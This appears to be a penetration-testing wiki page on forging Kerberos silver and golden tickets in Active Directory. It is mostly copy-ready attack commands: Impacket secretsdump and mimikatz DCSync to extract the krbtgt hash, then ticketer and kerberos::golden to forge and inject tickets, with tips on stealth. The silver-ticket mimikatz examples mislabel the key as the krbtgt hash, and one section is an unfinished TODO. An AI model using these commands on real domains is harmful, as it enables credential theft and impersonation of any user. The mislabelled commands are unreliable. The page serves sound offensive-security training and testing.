---
description: MITRE ATT&CK™ Sub-techniques T1558.001 and T1558.002
---

# 🛠️ Forged tickets

## Theory

Silver and golden tickets are forged Kerberos tickets that can be used with [pass-the-ticket](pass-the-ticket.md) to access services in an Active Directory domain.

* **Silver ticket**: The NT hash \(or AES key\) of a service account can be used to forge a Service ticket that can later be used with [Pass-the-ticket](pass-the-ticket.md) to access that service
* **Goldent ticket**: The NT hash \(or AES key\) of the special account `krbtgt` can be used to forge a special TGT \(Ticket Granting Ticket\) that can later be used with [Pass-the-ticket](pass-the-ticket.md) to access any resource within the AD domain.

//TODO : MS14-068

## Practice

### Silver ticket

{% hint style="warning" %}
In order to craft a silver ticket, testers need to find the target service account's NT hash or AES key \(128 or 256 bits\).
{% endhint %}

{% hint style="success" %}
_"While the scope is more limited than Golden Tickets, the required hash is easier to get and there is no communication with a DC when using them, so detection is more difficult than Golden Tickets." \(_[_adsecurity.org_](https://adsecurity.org/?p=2011)_\)_
{% endhint %}

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/SecureAuthCorp/impacket) script [ticketer](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) can create silver tickets.

```bash
# with an NT hash
python ticketer.py -nthash $NThash -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username

# with an AES (128 or 256 bits) key
python ticketer.py -aesKey $AESkey -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username
```
{% endtab %}

{% tab title="Windows" %}
On Windows, [mimikatz](https://github.com/gentilkiwi/mimikatz) can be used to generate a silver ticket. Testers need to carefully choose the right SPN type \(cifs, http, ldap, host, rpcss\) depending on the wanted usage.

```bash
# with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

# with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

# with an AES 256 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt
```

For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject the ticket](pass-the-ticket.md#injecting-the-ticket).
{% endtab %}
{% endtabs %}

### Golden ticket

{% hint style="warning" %}
In order to craft a golden ticket, testers need to find the krbtgt's NT hash or AES key \(128 or 256 bits\). In most cases, this can only be achieved with domain admin privileges. Because of this, golden tickets only allow lateral movement and not privilege escalation.
{% endhint %}

{% hint style="success" %}
Microsoft uses AES 256 bits by default. Using this encryption algorithm will be stealthier.
{% endhint %}

{% tabs %}
{% tab title="UNIX-like" %}
There are [Impacket](https://github.com/SecureAuthCorp/impacket) scripts for each step of a golden ticket creation : retrieving the `krbtgt`, retrieving the domain SID, creating the golden ticket.

```bash
# Retrieve the krbtgt NT hash or AES key
secretsdump.py -just-dc-user krbtgt -hashes 'LMhash:NThash' 'DOMAIN/DomainAdmin@DomainController'

# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

# Create the golden ticket (with an NT hash)
ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN randomuser

# Create the golden ticket (with an AES 128/256bits key)
ticketer.py -aesKey $krbtgtAESkey -domain-sid $domainSID -domain $DOMAIN randomuser
```
{% endtab %}

{% tab title="Windows" %}
On Windows, [mimikatz](https://github.com/gentilkiwi/mimikatz) can be used.

```bash
# Retrieve the krbtgt NT hash or AES keys
lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt

# with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:randomuser /ptt

# with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:randomuser /ptt

# with an AES 256 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:randomuser /ptt
```

For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject the ticket](pass-the-ticket.md#injecting-the-ticket).
{% endtab %}
{% endtabs %}

### 🛠️ MS14-068

//TODO

{% hint style="info" %}
**Convert ticket to UNIX &lt;-&gt; Windows format**

To convert tickets between UNIX/Windows format with [ticketConverter.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py).

```bash
# Windows -> UNIX
ticketConverter.py $ticket.kirbi $ticket.ccache

# UNIX -> Windows
ticketConverter.py $ticket.ccache $ticket.kirbi
```
{% endhint %}

## References

{% embed url="https://en.hackndo.com/kerberos-silver-golden-tickets/" caption="" %}

{% embed url="https://adsecurity.org/?p=2011" caption="" %}

{% embed url="https://adsecurity.org/?p=483" caption="" %}

{% embed url="https://en.hackndo.com/kerberos" caption="" %}

